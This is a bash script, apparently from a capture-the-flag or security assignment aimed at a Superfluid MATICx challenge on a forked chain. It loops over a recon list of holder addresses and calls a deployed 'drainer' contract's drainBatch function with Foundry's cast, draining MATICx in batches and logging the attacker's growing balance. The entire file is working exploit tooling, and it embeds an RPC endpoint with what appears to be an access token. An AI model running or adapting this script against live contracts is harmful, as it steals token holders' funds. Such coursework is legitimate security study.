#!/bin/bash
# Fast batch drain MATICx using cast send
set -e
cd /Users/dldustn/Desktop/upside_assignment/AssignmentC
source .env 2>/dev/null

RPC="https://REDACTED.example.invalid/9211c782-ae68-44dd-96a4-6a307c4e3091/rpc/4gi_akali:575d580ce56856c4751f2afb8daf13cc21c4eefd48958f1734e36a44d5f23734"
DRAINER=0x135bA7F14dB39f76e53F463F753472F4a029a6E7
MATICX=0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3
RECON=/Users/dldustn/Desktop/upside_assignment/AssignmentC/challenges/ch4_superfluid/recon/tmp_scan/maticx_fork24684669_positive_full.tsv
BATCH=20
SKIP=7  # skip first 7 (already drained by initial script and test)

remaining=$(cast balance $MATICX --rpc-url "$RPC")
echo "MATICx remaining: $remaining"

line_num=0
batch_addrs=""
batch_count=0
total_batches=0

while IFS=$'\t' read -r addr old_bal; do
    line_num=$((line_num + 1))
    if [ $line_num -le $SKIP ]; then continue; fi

    # Checksum the address
    addr_cs=$(cast to-check-sum-address "$addr" 2>/dev/null) || continue

    if [ -z "$batch_addrs" ]; then
        batch_addrs="$addr_cs"
    else
        batch_addrs="$batch_addrs,$addr_cs"
    fi
    batch_count=$((batch_count + 1))

    if [ $batch_count -ge $BATCH ]; then
        # Check remaining
        remaining=$(cast balance $MATICX --rpc-url "$RPC" 2>/dev/null) || remaining=1
        if [ "$remaining" = "0" ]; then
            echo "FULLY DRAINED!"
            exit 0
        fi

        total_batches=$((total_batches + 1))
        cast send $DRAINER "drainBatch(address[])" "[$batch_addrs]" \
            --rpc-url "$RPC" --private-key "$PRIVATE_KEY" --gas-limit 29000000 \
            > /dev/null 2>&1 || true

        if [ $((total_batches % 5)) -eq 0 ]; then
            remaining=$(cast balance $MATICX --rpc-url "$RPC" 2>/dev/null)
            mybal=$(cast balance $(cast wallet address $PRIVATE_KEY) --rpc-url "$RPC" --ether 2>/dev/null)
            echo "Batch $total_batches (line $line_num): MATICx=$remaining, mine=$mybal"
        fi

        batch_addrs=""
        batch_count=0
    fi
done < "$RECON"

# Final batch
if [ $batch_count -gt 0 ]; then
    cast send $DRAINER "drainBatch(address[])" "[$batch_addrs]" \
        --rpc-url "$RPC" --private-key "$PRIVATE_KEY" --gas-limit 29000000 \
        > /dev/null 2>&1 || true
fi

remaining=$(cast balance $MATICX --rpc-url "$RPC")
mybal=$(cast balance $(cast wallet address $PRIVATE_KEY) --rpc-url "$RPC" --ether)
echo "FINAL: MATICx=$remaining, mine=$mybal"
